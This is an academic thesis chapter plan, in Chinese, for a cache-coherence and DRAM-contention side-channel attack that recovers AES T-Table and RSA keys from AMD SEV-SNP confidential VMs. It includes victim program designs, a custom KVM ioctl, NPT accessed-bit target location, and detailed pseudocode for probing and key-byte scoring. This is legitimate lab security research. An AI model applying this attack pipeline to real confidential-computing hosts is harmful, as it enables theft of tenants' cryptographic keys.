# 第五章实验计划

> 章节定位：承载创新点 3（端到端密钥恢复攻击系统）。实验重点在于**系统设计验证**和**密钥恢复效果评估**，直接引用第 4 章的信道参数（阈值、选线、信号特征）。

---

## 写作进度

| 小节                      | 状态       | 说明                                                          |
| ------------------------- | ---------- | ------------------------------------------------------------- |
| §5.1 实验平台与环境配置   | **已起草** | 含硬件平台、VM 配置、执行路径验证，数据已填入                 |
| §5.2 端到端攻击系统架构   | **已起草** | 三模块流水线 + KVM 内核扩展均已描述；纯文字节，无实验数据依赖 |
| §5.3 AES T-Table 密钥恢复 | 待写       | 含 Top-K 选线（前置）→ 单字节 PoC → 完整密钥恢复 → 收敛曲线   |
| §5.4 RSA 平方-乘密钥恢复  | 待写       | 含操作区分 → 比特序列重建 → 多次签名累积                      |
| §5.5 攻击效果综合评估     | 待写       | 含多负载鲁棒性、一致性、自适应阈值验证、与 Prime+Probe 对比   |

> **§5.2 不含独立实验**：GPA→HPA 地址解析已在架构文字中描述完毕（KVM ioctl 方案），SNR Top-K 选线作为 §5.3 的前置步骤，自适应阈值稳定性归入 §5.5 综合评估。

---

## 通用实验环境

| 项目             | 配置                                                                                                                                                     |
| ---------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| CPU              | AMD EPYC 7763，64 核，与第 4 章相同平台                                                                                                                  |
| 宿主内核         | 6.16.0-snp-host（AMDSEV upstream，含 KVM 内核扩展补丁）                                                                                                  |
| 虚拟化           | KVM + QEMU，启用 SEV-SNP                                                                                                                                 |
| 受害者 VM        | 单 vCPU，绑核至同一物理核超线程对，BusyBox，SEV-SNP 机密模式启动                                                                                         |
| 受害者密码库     | OpenSSL 3.4.0 `no-asm`（T-Table AES）+ Libgcrypt 1.7.6（非常量时间 RSA）                                                                                 |
| 攻击者           | 宿主侧进程，`sched_setaffinity` 绑核至受害者 vCPU 的 HT sibling                                                                                          |
| 探测参数         | 阈值 θ\*=466 cyc、Top-K 缓存行编号均来自第 4 章实验结论                                                                                                  |
| 时间测量         | `rdtscp`                                                                                                                                                 |
| GPA→HPA 地址解析 | KVM 内核补丁（`kvm_main.c`）提供的 `KVM_AMD_GPA_TO_HPA` ioctl（命令号 0xd6），攻击开始前一次性调用；私有页走 `kvm_gmem_get_pfn()`，共享页走标准 HVA 路径 |

### 密码库版本选择

| 密码库      | 版本要求                                          | 原因                                                               |
| ----------- | ------------------------------------------------- | ------------------------------------------------------------------ |
| OpenSSL AES | 3.4.0，`no-asm` 编译，强制关闭 AES-NI             | 新版本默认走硬件指令路径，无 T-Table 查表行为                      |
| RSA         | Libgcrypt 1.7.6，标准模幂路径（未启用随机化盲化） | 内层模乘函数 `mpi_mulm` 的调用与否由密钥比特决定，形成可探测侧信道 |

> ⚠️ **必须在实验前完成执行路径验证（§5.1-A）**，否则后续攻击无信号可观测。

---

## 受害者程序设计

> 设计原则：**触发时机确定、密钥固定、执行路径纯净、无背景噪声**。

### AES 受害者程序（victim_aes）

**行为**：

1. 启动时用硬编码固定密钥初始化 AES 上下文（`AES_set_encrypt_key`），密钥全程不变
2. 监听本地 TCP 端口（9000）
3. 每收到一个 16 字节请求：执行 `AES_encrypt(plaintext, ciphertext, &key)`，返回 16 字节密文，关闭连接
4. 循环等待下一个请求，不做任何其他工作

**编译（`no-asm` OpenSSL）**：

```bash
gcc -o victim_aes victim_aes.c \
    -L/opt/openssl-noasm/lib -lssl -lcrypto \
    -Wl,-rpath,/opt/openssl-noasm/lib
```

**T-Table 访问模式**（AES 第一轮全部 4 个输出字展开，来自 `aes_core.c` 第 1455–1458 行）：

```c
/* 初始轮密钥加：si 为 4 字节明文 XOR 4 字节轮密钥的组合字 */
s0 = GETU32(pt +  0) ^ rk[0];   /* pt[0..3]   ^ key[0..3]   */
s1 = GETU32(pt +  4) ^ rk[1];   /* pt[4..7]   ^ key[4..7]   */
s2 = GETU32(pt +  8) ^ rk[2];   /* pt[8..11]  ^ key[8..11]  */
s3 = GETU32(pt + 12) ^ rk[3];   /* pt[12..15] ^ key[12..15] */

/* 第一轮（每个输出字各查 4 张表，共 16 次查表）：*/
t0 = Te0[s0>>24]         ^ Te1[(s1>>16)&0xff] ^ Te2[(s2>>8)&0xff] ^ Te3[s3&0xff]         ^ rk[4];
t1 = Te0[s1>>24]         ^ Te1[(s2>>16)&0xff] ^ Te2[(s3>>8)&0xff] ^ Te3[s0&0xff]         ^ rk[5];
t2 = Te0[s2>>24]         ^ Te1[(s3>>16)&0xff] ^ Te2[(s0>>8)&0xff] ^ Te3[s1&0xff]         ^ rk[6];
t3 = Te0[s3>>24]         ^ Te1[(s0>>16)&0xff] ^ Te2[(s1>>8)&0xff] ^ Te3[s2&0xff]         ^ rk[7];

/* 展开为明文/密钥字节索引：*/
/* t0: Te0[pt[0]^key[0]]  Te1[pt[5]^key[5]]  Te2[pt[10]^key[10]] Te3[pt[15]^key[15]] */
/* t1: Te0[pt[4]^key[4]]  Te1[pt[9]^key[9]]  Te2[pt[14]^key[14]] Te3[pt[3]^key[3]]  */
/* t2: Te0[pt[8]^key[8]]  Te1[pt[13]^key[13]] Te2[pt[2]^key[2]]  Te3[pt[7]^key[7]]  */
/* t3: Te0[pt[12]^key[12]] Te1[pt[1]^key[1]] Te2[pt[6]^key[6]]  Te3[pt[11]^key[11]] */
```

**关键事实**：每次 AES-128 加密，**每张 T-Table 被访问 4 次**（来自 4 个输出字），一次完整加密共产生 16 次第一轮查表。后续轮次（第 2–9 轮）使用上一轮输出作为索引，索引值对攻击者未知，形成随机噪声。

每个查表索引 = 同一位置的明文字节 XOR 密钥字节，即 index = pt[i] ^ key[i]，无跨位置交叉。攻击者已知明文，通过枚举 256 个候选密钥字节、比对 H1/H0 观测序列，逐字节恢复密钥。

**密钥字节到 T-Table 的完整映射**：

| 密钥字节 | 使用表 | 明文字节 | 全局缓存行范围（若4表同页） |
| -------- | ------ | -------- | --------------------------- |
| key[0]   | Te0    | pt[0]    | 行 0–15                     |
| key[1]   | Te1    | pt[1]    | 行 16–31                    |
| key[2]   | Te2    | pt[2]    | 行 32–47                    |
| key[3]   | Te3    | pt[3]    | 行 48–63                    |
| key[4]   | Te0    | pt[4]    | 行 0–15                     |
| key[5]   | Te1    | pt[5]    | 行 16–31                    |
| key[6]   | Te2    | pt[6]    | 行 32–47                    |
| key[7]   | Te3    | pt[7]    | 行 48–63                    |
| key[8]   | Te0    | pt[8]    | 行 0–15                     |
| key[9]   | Te1    | pt[9]    | 行 16–31                    |
| key[10]  | Te2    | pt[10]   | 行 32–47                    |
| key[11]  | Te3    | pt[11]   | 行 48–63                    |
| key[12]  | Te0    | pt[12]   | 行 0–15                     |
| key[13]  | Te1    | pt[13]   | 行 16–31                    |
| key[14]  | Te2    | pt[14]   | 行 32–47                    |
| key[15]  | Te3    | pt[15]   | 行 48–63                    |

规律：`table_idx = key_byte_pos % 4`，`pt_byte_idx = key_byte_pos`（明文字节与密钥字节下标相同）。Te0 负责 key[0,4,8,12]，Te1 负责 key[1,5,9,13]，Te2 负责 key[2,6,10,14]，Te3 负责 key[3,7,11,15]。

**缓存行命中公式**：

```
index_i = pt[i] ^ key[i]
命中的缓存行（表内局部行号）= index_i >> 4   （取高 4 位）
全局行号（4 表同页时）      = (i % 4) * 16 + (index_i >> 4)
```

单次观测只给出 `(pt[i] ^ key[i]) >> 4 = L`，即 `key[i]` 高 4 位可由 `L ^ (pt[i] >> 4)` 推断；经多次不同明文观测后，相关性最高的候选 key[i] 即为真实密钥字节（8 位全部可恢复）。

**注意**：Te0–Te3 四张表各 `static const u32[256]`（1024 字节），在同一编译单元中连续声明，链接后在 `.rodata` 段内连续布局（总计 4096 字节）。Te0 的起始地址**不保证页对齐**：若 Te0[0] 在页内有非零偏移，4096 字节范围将横跨两个物理 4KB 页。攻击实现中直接通过 `KVM_AMD_GPA_TO_HPA(te0_gpa)` 获取 Te0[0] 的精确物理地址 `te_base_hpa`，以 `te_base_hpa + i*64` 寻址各缓存行，无需假设页对齐。

**为什么容易攻击**：

| 设计决策              | 作用                                      |
| --------------------- | ----------------------------------------- |
| 每次请求独立 TCP 连接 | 攻击者可精确标定每次加密的开始时刻        |
| 不做批处理            | 避免多次加密信号混叠                      |
| 不做日志/文件 I/O     | 消除背景 cache 噪声                       |
| 密钥硬编码、不轮换    | 允许多次独立观测累积统计                  |
| 明文由攻击者控制      | 允许选择性明文攻击，控制 T-Table 访问模式 |

---

### RSA 受害者程序（victim_rsa）

**行为**：

1. 启动时加载硬编码的 RSA-2048 私钥（PEM 格式）
2. 监听本地 TCP 端口（9001）
3. 每收到一个 32 字节 hash 请求：调用 Libgcrypt `gcry_pk_sign()`，内部 `gcry_mpi_powm` 按密钥比特逐位执行（bit=1 时调用 `mpi_mulm` multiply，bit=0 时只做 square），返回签名
4. 攻击者观测每一比特位置是否有额外的 `mpi_mulm` cache line 访问

**操作-比特映射关系**：

```
for each bit of private key d (MSB → LSB):
    mpi_mulm(square)      ← 每个比特都执行 → 每个比特位置出现一次 H1
    if bit == 1:
        mpi_mulm(multiply) ← 仅 bit=1 执行 → 该位置出现第二次 H1

观测规则：
  某比特位置出现 1 次 H1 → bit = 0
  某比特位置出现 2 次 H1 → bit = 1
```

**为什么容易攻击**：

| 设计决策          | 作用                                 |
| ----------------- | ------------------------------------ |
| 密钥固定          | 允许多次独立观测取多数投票           |
| hash 由攻击者控制 | 允许重放同一请求多次，降低单次误判率 |
| 无批处理          | 每次签名产生独立可分析的时序序列     |

---

### 集成进受害者 BusyBox VM

BusyBox 缺少包管理器，推荐静态编译后通过 `virtio-fs` 或直接写入 VM 镜像传入：

```bash
# 确认链接到 no-asm 版本
ldd victim_aes  # 应指向 /opt/openssl-noasm/lib/

# 绑核至 victim vCPU 对应的逻辑核，与攻击者进程共享同一物理核超线程对
taskset -c <victim_vcpu_core> ./victim_aes &
taskset -c <victim_vcpu_core> ./victim_rsa &
```

---

## 攻击前置：目标 GPA 定位

> 本节说明攻击者如何在 SEV-SNP 环境下找到 Te0–Te3 / `mpi_mulm` 在来宾物理地址空间（GPA）中的位置，是所有攻击实验的共同前提。

### 为什么不能读来宾页表

SEV-SNP 中来宾内存全程加密，**hypervisor 无法解密来宾的 GVA→GPA 页表**（页表本身存储在加密内存中，hypervisor 读到的是密文）。因此不能用"读来宾 `/proc/<pid>/pagemap`"或"遍历来宾页表"的方式定位目标函数。

### 正确方法：NPT Accessed 位监控

Hypervisor 控制 NPT（Nested Page Table，GPA→HPA 这一层），NPT 条目中有 Accessed 位，由硬件在 GPA 被访问时自动置位。利用这一机制：

```
① 清零嫌疑 GPA 范围内所有 NPT 条目的 Accessed 位
        ↓
② 通过 TCP 向受害者发送一次 AES 加密请求（触发一轮 T-Table 查表）
        ↓
③ 扫描同一 GPA 范围，找出 Accessed 位被置位的页面 → 候选集合
        ↓
④ 用相干逐出信号二次确认：对候选页面逐缓存行探测，
   仅在 AES 触发期间出现 H1 信号的缓存行即为 T-Table 所在位置
        ↓
⑤ 调用 KVM_AMD_GPA_TO_HPA ioctl 将确认的 GPA 转换为 HPA
```

### te0_gpa 的两段式推导

获得精确的 `te0_gpa`（Te0[0] 的字节级 GPA）需要两个信息的组合：

**① 页级 GPA（运行时，从 NPT 扫描获得）**

NPT Accessed 位扫描给出 T-Table 所在页的页对齐 GPA（记为 `te_page_gpa`），精度为 4KB。

**② 页内字节偏移（离线，从 ELF 二进制读取）**

Te0 在 `libcrypto.so` 文件中有固定字节偏移 `Te0_file_offset`。
ASLR 只改变库的加载基址，不改变库内部的段布局，因此：

```
te0_inpage_offset = Te0_file_offset % 4096
```

这是 ASLR 无关的常量，可在任意同版本 `libcrypto.so`（无需 SNP 环境）上一次性计算。

**合并得到精确 GPA：**

```
te0_gpa = te_page_gpa + te0_inpage_offset
```

**实现路线**：

```
# === 离线阶段（任意有相同 libcrypto.so 的环境）===
te0_file_offset = nm /opt/openssl-noasm/lib/libcrypto.so \
                  | grep ' Te0$' | awk '{print strtonum("0x"$1)}'
# 减去 libcrypto.so 段的 VMA 基地址，得到文件内偏移（通常 nm 直接给 VMA）
# 对于 .rodata：Te0_file_offset ≈ Te0_VMA - load_bias（可从 readelf -S 获取 .rodata 的 VMA 与文件偏移差值）
te0_inpage_offset = te0_file_offset % 4096
# 记录 te0_inpage_offset（固定常量，整个攻击过程复用）

# === 运行时阶段（SNP 宿主侧）===
宿主侧 KVM 模块（新增辅助函数）：
  kvm_npt_clear_accessed(kvm, gpa_start, gpa_end)   # 清零 NPT Accessed
  kvm_npt_scan_accessed(kvm, gpa_start, gpa_end)    # 返回被置位的页对齐 GPA 列表

攻击者用户态流程：
  1. suspected_range = 参考 VM 中 libcrypto.so 的 GPA 加载范围（含2页余量）
  2. kvm_npt_clear_accessed(suspected_range)
  3. send_tcp_request(victim_aes, plaintext)          # 触发一次 AES
  4. candidate_pages = kvm_npt_scan_accessed(suspected_range)
     # candidate_pages 包含 T-Table 所在页（页对齐 GPA），通常 1–2 个页
  5. for page_gpa in candidate_pages:
       te0_gpa_candidate = page_gpa + te0_inpage_offset
       probe_coherence_signal(te0_gpa_candidate)      # 验证该地址是否产生 H1 信号
       if signal == H1:
           te_page_gpa = page_gpa                     # 确认 T-Table 所在页
           break
  6. te0_gpa = te_page_gpa + te0_inpage_offset
  7. te_base_hpa = KVM_AMD_GPA_TO_HPA(te0_gpa)       # 字节级 HPA，非页对齐
```

> 注：步骤 5 的相干逐出信号验证只需在找到第一个候选页后确认一次，通常 candidate_pages 仅 1–2 个页，循环开销可忽略。
> `mpi_mulm` 的 GPA 定位方法相同：`mpi_mulm_inpage_offset` 从 Libgcrypt 的 ELF 符号表读取，运行时 NPT 扫描触发一次 RSA 签名。

---

## 5.1 实验平台与环境配置

### 实验 5.1-A：受害者 VM 密码库执行路径验证 _(已完成)_

**目的**：确认 VM 内密码库确实走了非常量时间路径（T-Table AES / Square-and-Multiply RSA）。

**AES 验证结果**（perf annotate，3 次独立实验均值）：

| 指标                     | no-asm（T-Table） | 默认 asm（紧凑 S-box）        |
| ------------------------ | ----------------- | ----------------------------- |
| 热点函数                 | `AES_encrypt`     | `_x86_64_AES_encrypt_compact` |
| Te0–Te3 变址内存读取占比 | 7.48%             | 0.00%                         |
| `aesenc`/`vaesenc` 占比  | 0.00%             | 0.00%                         |

> 注：asm 参照组未见 AES-NI 指令，因受害者 VM vCPU 未向来宾暴露 AES-NI CPUID 标志，OpenSSL 回退至紧凑型 S-box 路径。

**RSA 验证结果**（6 次独立实验均值，100 密钥 × 1000 次签名）：

| 实现                                 | 均值（M cycles）      | 标准差（k cycles） | 变异系数 |
| ------------------------------------ | --------------------- | ------------------ | -------- |
| 非常量时间（Libgcrypt 1.7.6）        | 147.4                 | 357                | 0.24%    |
| 常量时间（OpenSSL BN_FLG_CONSTTIME） | 160.0                 | 915                | 0.57%    |
| 时延差                               | 12.6M cycles（≈8.5%） | —                  | —        |

**实现路线**：

```
VM 内（perf）：
  perf record -e cycles:u -g -- ./run_aes_noasm 10000000
  perf annotate AES_encrypt > annotate_noasm.txt

  perf record -e cycles:u -g -- ./run_aes_default 10000000
  perf annotate _x86_64_AES_encrypt_compact > annotate_asm.txt

  提取 Te0–Te3 变址读取指令（movl (%r10,%rbx,4)）占比

宿主侧（RSA 时延对比）：
  for key in $(seq 100); do
    gen_rsa2048_key key_$key.pem
    time_libgcrypt  key_$key.pem 1000  >> rsa_var.txt
    time_openssl_ct key_$key.pem 1000  >> rsa_const.txt
  done
  # 重复 6 次取均值
```

---

## 5.3 AES T-Table 密钥恢复攻击

### 实验 5.3-A：T-Table 缓存行 SNR Top-K 选线 _(前置步骤)_

**目的**：确定 Te0–Te3 物理页上 SNR 最强的缓存行，作为后续攻击的探测目标集合。DRAM 交错（interleaving）将物理上连续的地址分散到不同 DRAM 通道，导致同一物理页内不同缓存行的信号强度差异显著（第 4 章热力图实验中 line 0 的 Δ 仅 140.1 cyc、p_gt=0.3438，而多数行 p_gt=1.0）。**不能默认 Te0 第 0 行就是最佳探测目标**，必须实测选线。

**前提**：通过"攻击前置：目标 GPA 定位"流程定位 Te0 所在 GPA，再通过 `KVM_AMD_GPA_TO_HPA` ioctl 获得 Te0[0] 的 HPA（记为 `te_base_hpa`）。Te0–Te3 共 4 × 1024 = 4096 字节在内存中连续存储（同一 `.rodata` 编译单元），64 条缓存行地址为 `te_base_hpa + i*64`（i=0..63）。注意：Te0 的起始地址**不保证页对齐**，4096 字节范围可能横跨两个物理页，但探测时直接使用 `te_base_hpa + i*64` 作为物理地址，与页边界无关。

**方法**：

1. 对 T-Table 所在物理页的全部 64 条缓存行执行信号强度扫描（复用第 4 章 4.2-A+ 方法：VM 内重复访问目标 GPA，宿主侧测量每条缓存行的 H1/H0 延迟分布）
2. 按 Δ_mean 和 p_gt 指标排序，选取 SNR Top-K 缓存行
3. 对比 Top-1 / Top-3 / Top-5 / 全部 64 条在后续密钥恢复（5.3-C）中的效果

**产出**：

- [ ] T-Table 物理页缓存行 SNR 排序表
- [ ] 最优 K 值（由 5.3-C 反馈确定）

**实现路线**：

```
# te_base_hpa = KVM_AMD_GPA_TO_HPA(te0_gpa)   ← Te0[0] 的物理地址（非必然页对齐）
# 64 条缓存行按偏移寻址，与物理页边界无关：
#   全局行索引  0–15  → Te0  （te_base_hpa + idx*64, idx=0..15）
#   全局行索引 16–31  → Te1  （te_base_hpa + idx*64, idx=16..31）
#   全局行索引 32–47  → Te2  （te_base_hpa + idx*64, idx=32..47）
#   全局行索引 48–63  → Te3  （te_base_hpa + idx*64, idx=48..63）

宿主侧脚本（复用第 4 章扫描程序，修改目标 HPA）：
  te_base_hpa = ioctl(KVM_AMD_GPA_TO_HPA, te0_gpa)
  for line_idx in 0..63:
    hpa = te_base_hpa + line_idx * 64
    for i in 0..50000:
      victim_trigger()                   # 发送 TCP AES 请求
      t = rdtscp_load(hpa)               # 宿主侧加载计时
      record(line_idx, t)

  compute_snr(per_line_h0_h1_distribution)
  rank_by_delta_mean()
  select_top_k()  # 返回 top_k_lines（全局行索引列表，0..63）
```

---

### 实验 5.3-A'：T-Table 访问时序标定 _(Phase 2 前置步骤)_

**目的**：测量从 TCP 请求发送到 T-Table 相干逐出信号首次出现的时延分布，为 Phase 2 确定"事中探测"窗口参数 `t_offset_mean` 和 `t_offset_sigma`。

**背景**：第 4 章 §4.2.2（fig:contention_42b）和 §4.2.3（tab:stats_42c）实验揭示了竞争信号的本质：

| 条件 | 均值 | σ | P(T>700) |
|------|------|---|---------|
| H1 相干逐出 | 495.07 | 78.56 | 3.57% |
| H1 相干+竞争叠加 | 487.86 | 151.29 | **7.41%** |

竞争信号**没有**独立的双峰分离——均值反而略降，主要表现为极端尾部概率翻倍。因此竞争信号**不能**作为独立二值分类器，而是对相干逐出信号的尾部增强。

**两阶段的物理机制与分工**：

| 阶段 | 探测时机 | 探测路径 | 信号来源 | 信号强度 | 关键特性 |
|------|----------|----------|----------|----------|----------|
| Phase 2 | AES 执行期间 | NOCACHE（绕过缓存，直达 DRAM） | 来宾与宿主同时竞争 DRAM 总线 | 弱（Δ=104.8 cyc，无双峰） | **精确**：仅在物理地址完全相同时触发，无 DRAM 交错跨行干扰 |
| Phase 1 | AES 完成之后 | Cacheable（标准相干逐出路径） | C-bit 不匹配 → 来宾访问驱逐宿主缓存副本 | 强（Δ=470.8 cyc，AUC=0.9996） | **可靠**：信号持续到宿主再次预热，时序宽松；但 DRAM 交错可能引发跨行假阳性 |

两阶段互补：Phase 1 高灵敏度（不易漏报），Phase 2 高精度（不受 DRAM 交错空间噪声影响）。竞争信号虽弱，但其"精确物理地址匹配"特性正是消除第 4 章热力图中 DRAM 交错假阳性（如 line 0 弱信号、跨行串扰）的关键工具。

**标定方法**：用高频 cacheable 探测循环捕捉 H0→H1 转变时刻，测量 Phase 2 探测窗口：

1. 预热目标缓存行，发送 AES 请求，记录 t_send
2. 以每条目标缓存行约 200 cycles 的间隔连续 cacheable 轮询
3. 当某条行首次出现 H1（延迟 > θ*=466 cyc）时，记录 t_first_H1，计算偏移 = t_first_H1 - t_send
4. 重复 5000 次，拟合偏移分布（此分布近似代表来宾 DRAM 访问时刻的分布）

**产出**：

- [ ] H0→H1 转变时刻偏移分布直方图
- [ ] `t_offset_mean`，`t_offset_sigma`（Phase 2 NOCACHE 探测窗口中心和半宽）
- [ ] Phase 2 探测窗口定义：`t_send + t_offset_mean ± 2σ`

**实现路线**：

```
# 标定使用 cacheable 探测（与 Phase 1 路径一致），捕捉相干逐出 H1 的出现时刻
# 此时刻近似代表来宾 T-Table DRAM 访问窗口，作为 Phase 2 NOCACHE 探测的定位依据

宿主侧（标定程序）：
  offset_samples = []
  for trial in 0..5000:
    for cl in top_k_lines:
      rdtscp_load(hpa_table[cl])             # 预热

    t_send = rdtscp()
    send_tcp_async(victim_aes, fixed_plaintext)

    found = False
    while not tcp_response_ready():
      t_probe = rdtscp()
      for cl in top_k_lines:
        lat = rdtscp_load(hpa_table[cl])     # cacheable，捕捉首次 H0→H1 转变
        if lat > THETA_COHERENCE:
          offset_samples.append(t_probe - t_send)
          found = True; break
      if found: break
    consume_tcp_response()

  t_offset_mean  = mean(offset_samples)
  t_offset_sigma = std(offset_samples)
  # Phase 2 NOCACHE 探测窗口：[t_offset_mean - 2σ, t_offset_mean + 2σ]
```

---

### 实验 5.3-B：单密钥字节恢复 PoC

**目的**：验证能否通过监控单组 T-Table 缓存行恢复对应的密钥字节。

**方法**：

1. 攻击者监控 Te0 表中 SNR 最强的一条缓存行（覆盖 index ∈ [i×16, i×16+15] 的访问）
2. VM 内使用固定密钥 + 攻击者控制的明文反复执行 AES-128-ECB 加密
3. 记录每次加密时该缓存行的 H0/H1 探测结果
4. 对 256 个密钥字节候选值 k，统计"当 key[0]=k 时预测本次查表会命中被监控缓存行，且实际观测为 H1"的次数，命中率最高的候选值即为恢复结果（Te0 每次加密被访问 4 次，其中 key[0] 贡献 1 次，另外 3 次来自 key[4,8,12]，作为噪声但不破坏收敛性）

**产出**：

- [ ] 单密钥字节恢复成功率及所需加密轮次
- [ ] 候选密钥字节相关性得分分布图

**实现路线**：

```
# 两阶段探测协议：
#   Phase 1（相干逐出，事后）：预热 → 触发 AES → 等响应 → Cacheable 探测
#   Phase 2（内存竞争，事中）：在 [t_offset_mean ± 2σ] 窗口内 NOCACHE 轮询
# Phase 2 参数来自 5.3-A' 标定；θ_coherence=466 cyc（第4章）；θ_contention 见 5.3-A'。

攻击者（宿主侧）：
  hpa_table = [KVM_AMD_GPA_TO_HPA((te0_gpa & ~63) + i*64) for i in 0..63]
  target_cl = top1_snr_line(te0_region)           # Te0 中 Phase 1 SNR 最强行，0..15
  target_hpa = hpa_table[target_cl]

  observations = []
  for i in 0..N:
    pt = random_16bytes()                          # 全部 16 字节随机化

    # ── 预热（Phase 1 前提：宿主缓存热 → 来宾访问 → 驱逐 → H1）────────
    rdtscp_load(target_hpa)

    # ── 触发 AES，记录发送时刻 ────────────────────────────────────────
    t_send = rdtscp()
    send_tcp_async(victim_aes, pt)

    # ── Phase 2：AES 执行期间的 NOCACHE 探测（精确定位，消除 DRAM 交错假阳性）──
    # 物理机制：NOCACHE 绕过宿主缓存直达 DRAM；若来宾同时从 DRAM 取该行，
    #           双方竞争 DRAM 总线 → 宿主 NOCACHE 延迟升高（第4章 42b：Δ=104.8 cyc）
    # 关键优势：需要精确物理地址重叠才触发，不受 DRAM 交错跨行串扰影响
    # 信号弱（无双峰），但"只命中访问过的精确缓存行"特性用于过滤 Phase 1 假阳性
    phase2_h1 = False
    t_win_start = t_send + t_offset_mean - 2 * t_offset_sigma
    t_win_end   = t_send + t_offset_mean + 2 * t_offset_sigma
    while rdtscp() < t_win_start:
      pass
    while rdtscp() < t_win_end:
      lat = ioctl(KVM_AMD_READ_GPA, {hpa: target_hpa, mode: CIPHERTEXT_NOCACHE})
      if lat > THETA_CONTENTION:               # 42b：中点约 430 cyc
        phase2_h1 = True; break

    # ── 等待 AES 完成 ──────────────────────────────────────────────────
    wait_tcp_response()

    # ── Phase 1：AES 完成后的 cacheable 相干逐出探测（高灵敏度保底）────
    # 物理机制：来宾访问 C=1 侧驱逐宿主 C=0 侧缓存副本；宿主探测需重从 DRAM 取
    # 信号强（Δ=470.8 cyc，AUC=0.9996），但 DRAM 交错可能引发跨行 H1
    lat_p1    = rdtscp_load(target_hpa)
    phase1_h1 = (lat_p1 > THETA_COHERENCE)    # θ*=466 cyc

    # ── 合并信号：OR 合并（Phase 2 高精度 + Phase 1 高灵敏度）─────────
    h1_combined = phase1_h1 or phase2_h1
    observations.append((pt[0], phase1_h1, phase2_h1, h1_combined))

  # 命中率评分（使用合并信号）
  for k in 0..255:
    hit_count = 0
    for (pt0, p1, p2, h1) in observations:
      if (pt0 ^ k) >> 4 == target_cl % 16:
        hit_count += h1
    score[k] = hit_count

  recovered_key_byte = argmax(score)
  print(f"真实: {true_key[0]:#x}, 恢复: {recovered_key_byte:#x}")

  # 额外分析：对比 phase1_only / phase2_only / combined 收敛速度
  # 预期：phase2_only 收敛慢（信号弱）但假阳性少；phase1_only 快但有 DRAM 交错噪声；
  #       combined 在落在弱 SNR 缓存行时（如 line 0）收益最大
```

---

### 实验 5.3-C：完整 AES-128 密钥恢复

**目的**：恢复全部 16 个密钥字节。

**方法**：

1. 同时监控 Te0–Te3 四个表的 Top-K 缓存行（基于 5.3-A 选线结果）
2. VM 执行大量（10,000–100,000 次）AES-128-ECB 加密，每次随机明文
3. 对每个密钥字节位置独立执行相关性分析，输出候选密钥与真实密钥对比

**产出**：

- [ ] 16 个密钥字节各自的恢复正确率（表格）
- [ ] 完整密钥恢复成功率 vs 加密轮次曲线
- [ ] 达到 100% 字节正确所需最小加密轮次
- [ ] 部分正确场景下的密钥搜索空间缩减比
- [ ] **DRAM 交错影响分析**：将 16 个字节按其访问索引所映射的缓存行 SNR 分组，验证落在弱 SNR 行的字节是否确实需要更多观测次数才能收敛

**关键评估指标**：

| 指标         | 说明                                                    |
| ------------ | ------------------------------------------------------- |
| 单字节正确率 | 16 个字节中恢复正确的比例                               |
| 密钥熵缩减   | $128 - \sum_{i=0}^{15} H(K_i \mid \text{observations})$ |
| 恢复轮次     | 达到目标正确率所需的最小加密次数                        |
| 端到端成功率 | 完整 128-bit 密钥完全正确的概率                         |

**实现路线**：

```
# AES 第一轮完整映射（来自 aes_core.c）：
#   key[i] → Te[i%4]，查表索引 = pt[i] ^ key[i]（明文字节下标与密钥字节下标相同）
#   Te0: key[0,4,8,12]；Te1: key[1,5,9,13]；Te2: key[2,6,10,14]；Te3: key[3,7,11,15]
#
# 4 张表每次加密各被访问 4 次；仅第一轮索引含明文 XOR 密钥结构，后续轮为噪声。
#
# Te0–Te3 在内存中连续存储，Te0[0] 的物理地址 te_base_hpa 由 ioctl 获取（非必然页对齐）：
#   全局行索引  0–15  → Te0（覆盖 key[0,4,8,12]）
#   全局行索引 16–31  → Te1（覆盖 key[1,5,9,13]）
#   全局行索引 32–47  → Te2（覆盖 key[2,6,10,14]）
#   全局行索引 48–63  → Te3（覆盖 key[3,7,11,15]）
#   probe_hpa = te_base_hpa + global_line_idx * 64  （与页边界无关）

攻击者（宿主侧）：
  # 缓存行精确 HPA：每条独立查询，防止跨 GPA 页时 te_base_hpa + i*64 无效
  hpa_table = [KVM_AMD_GPA_TO_HPA((te0_gpa & ~63) + i*64) for i in 0..63]
  monitored = set(top_k_lines)  # top_k_lines 来自 5.3-A SNR 选线

  observations = []
  for i in 0..N:
    pt = random_16bytes()

    # ── 预热所有监控缓存行 ──────────────────────────────────────────
    for cl in top_k_lines:
      rdtscp_load(hpa_table[cl])

    # ── 触发 AES ────────────────────────────────────────────────────
    t_send = rdtscp()
    send_tcp_async(victim_aes, pt)

    # ── Phase 2：AES 执行期间，NOCACHE 竞争探测（精确定位）─────────────
    # 需要精确物理地址重叠才触发竞争 → 过滤 Phase 1 的 DRAM 交错跨行假阳性
    phase2_hits = {}
    t_win_start = t_send + t_offset_mean - 2 * t_offset_sigma
    t_win_end   = t_send + t_offset_mean + 2 * t_offset_sigma
    while rdtscp() < t_win_start:
      pass
    while rdtscp() < t_win_end:
      for cl in top_k_lines:
        lat = ioctl(KVM_AMD_READ_GPA, {hpa: hpa_table[cl], mode: CIPHERTEXT_NOCACHE})
        if lat > THETA_CONTENTION and cl not in phase2_hits:
          phase2_hits[cl] = True

    wait_tcp_response()

    # ── Phase 1：AES 完成后，cacheable 相干逐出探测（高灵敏度）──────────
    phase1_hits = {cl: rdtscp_load(hpa_table[cl]) > THETA_COHERENCE for cl in top_k_lines}

    # ── 合并：OR 合并，Phase 2 H1 提升精度，Phase 1 H1 保证覆盖率 ────────
    combined_hits = {cl: phase1_hits[cl] or phase2_hits.get(cl, False)
                     for cl in top_k_lines}
    observations.append((pt, combined_hits))

  # ── 密钥恢复：命中率评分（与原方案相同，使用合并信号）──────────────
  for byte_pos in 0..15:
    table_idx   = byte_pos % 4
    pt_byte_idx = byte_pos

    for k in 0..255:
      hit_count = 0; valid_count = 0
      for (pt_j, hits_j) in observations:
        pred_local_line  = (pt_j[pt_byte_idx] ^ k) >> 4
        pred_global_line = table_idx * 16 + pred_local_line
        if pred_global_line in monitored:
          hit_count   += hits_j[pred_global_line]
          valid_count += 1
      score[byte_pos][k] = hit_count / valid_count if valid_count > 0 else 0

    recovered[byte_pos] = argmax(score[byte_pos])

  # ── 可选：分别用 phase1_hits / phase2_hits 单独评分，输出两阶段贡献对比 ──
```

---

### 实验 5.3-D：恢复率收敛曲线

**目的**：展示恢复率随观测次数的收敛趋势，量化攻击效率。

